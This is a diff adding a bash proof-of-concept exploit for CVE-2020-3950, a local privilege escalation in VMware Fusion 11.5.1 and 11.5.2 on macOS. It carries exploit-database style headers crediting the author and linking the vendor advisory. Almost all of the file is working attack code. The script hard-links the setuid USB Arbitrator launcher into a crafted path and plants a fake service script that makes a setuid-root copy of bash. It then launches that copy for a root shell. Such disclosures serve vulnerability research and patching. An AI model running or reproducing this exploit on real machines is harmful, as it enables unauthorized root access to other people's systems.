@@ -1,0 +1,43 @@
+# Exploit Title: VMware Fusion 11.5.2 - Privilege Escalation
+# Date: 2020-03-17
+# Exploit Author: Rich Mirch
+# Vendor Homepage: https://www.vmware.com/products/fusion.html
+# Vendor Advisory: https://www.vmware.com/security/advisories/VMSA-2020-0005.html
+# Software Link: https://download3.vmware.com/software/fusion/file/VMware-Fusion-11.5.1-15018442.dmg
+# Versions:
+# VMware Fusion Professional 11.5.1 (15018442)
+# VMware Fusion Professional 11.5.2 (15794494)
+#
+# Tested on: macOS 10.14.6
+# CVE : CVE-2020-3950
+# Source PoC: https://raw.githubusercontent.com/mirchr/security-research/master/vulnerabilities/CVE-2020-3950.sh
+#
+#
+#!/bin/bash
+echo "CVE-2020-3950 VMware Fusion EoP PoC by @0xm1rch"
+
+mkdir -p ~/a/b/c
+mkdir -p ~/Contents/Library/services
+
+cat > ~/Contents/Library/services/VMware\ USB\ Arbitrator\ Service <<EOF
+#!/usr/bin/python
+import os
+os.setuid(0)
+os.system("cp /bin/bash $HOME/.woot;chmod 4755 $HOME/.woot");
+EOF
+
+chmod 755 ~/Contents/Library/services/VMware\ USB\ Arbitrator\ Service
+
+cd ~/a/b/c
+ln "/Applications/VMware Fusion.app/Contents/Library/services/Open VMware USB Arbitrator Service" . 2>/dev/null
+"${PWD}/Open VMware USB Arbitrator Service" >/dev/null 2>/dev/null &
+p=$!
+echo "Sleeping for 5 seconds"
+sleep 5
+kill ${p?}
+wait
+
+echo "Sleeping for 7 seconds"
+sleep 7
+
+$HOME/.woot -p
